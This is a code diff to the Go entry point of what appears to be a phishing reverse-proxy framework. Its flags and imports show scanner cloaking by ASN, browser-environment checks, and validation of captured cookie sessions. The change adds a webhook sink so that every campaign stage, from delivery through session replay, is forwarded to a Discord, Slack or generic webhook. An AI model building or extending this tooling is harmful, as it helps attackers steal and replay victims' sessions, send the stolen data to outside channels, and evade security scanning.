@@ -21,12 +21,12 @@ import (
 	"github.com/s4l1hs/olta/pkg/proxy/log"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/jsinspect"
-	"github.com/s4l1hs/olta/pkg/proxy/telemetry"
 	"github.com/s4l1hs/olta/pkg/proxy/validation"
 	"github.com/s4l1hs/olta/pkg/runtimepath"
 	sqlitedsn "github.com/s4l1hs/olta/pkg/storage/sqlite"
-	attacktelemetry "github.com/s4l1hs/olta/pkg/telemetry"
+	"github.com/s4l1hs/olta/pkg/telemetry"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/campaigndb"
+	"github.com/s4l1hs/olta/pkg/telemetry/sink/webhook"
 	"go.uber.org/zap"
 )
 
@@ -54,7 +54,7 @@ var ip_sync_interval = flag.Duration("ip-sync-interval", 12*time.Hour, "Interval
 var enable_js_inspect = flag.Bool("enable-js-inspect", false, "Enable client-side browser environment verification")
 var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js", "Internal route used for client browser verification assertions")
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
-var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook for session validation telemetry")
+var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook that receives every engagement telemetry stage")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -187,19 +187,40 @@ func main() {
 		}
 	}()
 
+	telemetryDB, err := gorm.Open("sqlite3", sqlitedsn.ConcurrentDSN(*campaign_db))
+	if err != nil {
+		log.Fatal("open telemetry database: %v", err)
+		return
+	}
+	defer func() {
+		if err := telemetryDB.Close(); err != nil {
+			log.Error("telemetry database shutdown: %v", err)
+		}
+	}()
+
+	// -webhook-url now feeds the shared bus, so every stage reaches it —
+	// delivery through replay — not only session-validation results as
+	// before.
+	sinks := []telemetry.Sink{campaigndb.New(telemetryDB)}
+	if strings.TrimSpace(*webhook_url) != "" {
+		webhookSink, err := webhook.New(*webhook_url, nil)
+		if err != nil {
+			log.Fatal("configure webhook sink: %v", err)
+			return
+		}
+		sinks = append(sinks, webhookSink)
+	}
+	telemetryBus := telemetry.NewBus(1024, sinks...)
+	defer func() {
+		if err := telemetryBus.Close(); err != nil {
+			log.Error("telemetry bus shutdown: %v", err)
+		}
+	}()
+
 	var sessionValidator *validation.Worker
 	if *enable_session_validator {
-		if strings.TrimSpace(*webhook_url) == "" {
-			log.Fatal("session validator requires -webhook-url")
-			return
-		}
-		dispatcher, err := telemetry.NewDispatcher(*webhook_url, nil)
-		if err != nil {
-			log.Fatal("session validator webhook: %v", err)
-			return
-		}
 		sessionValidator, err = validation.NewWorker(validation.WorkerConfig{
-			Dispatcher: dispatcher,
+			Emitter: telemetryBus,
 			OnResult: func(result validation.Result) {
 				log.Info("session validator: %s session %s for %s", result.Status, result.SessionReference, result.TargetHost)
 			},
@@ -227,7 +248,7 @@ func main() {
 			}
 		})
 		defer unsubscribe()
-		log.Info("asynchronous session validator enabled with %s telemetry", dispatcher.Provider())
+		log.Info("asynchronous session validator enabled with replay telemetry")
 	}
 
 	campaignEvents, err := campaignstore.New(*campaign_db, *feed_url, *feed_enabled)
@@ -238,24 +259,6 @@ func main() {
 	defer func() {
 		if err := campaignEvents.Close(); err != nil {
 			log.Error("campaign event store shutdown: %v", err)
-		}
-	}()
-
-	telemetryDB, err := gorm.Open("sqlite3", sqlitedsn.ConcurrentDSN(*campaign_db))
-	if err != nil {
-		log.Fatal("open telemetry database: %v", err)
-		return
-	}
-	defer func() {
-		if err := telemetryDB.Close(); err != nil {
-			log.Error("telemetry database shutdown: %v", err)
-		}
-	}()
-
-	telemetryBus := attacktelemetry.NewBus(1024, campaigndb.New(telemetryDB))
-	defer func() {
-		if err := telemetryBus.Close(); err != nil {
-			log.Error("telemetry bus shutdown: %v", err)
 		}
 	}()
 	campaignEvents.SetEmitter(telemetryBus)
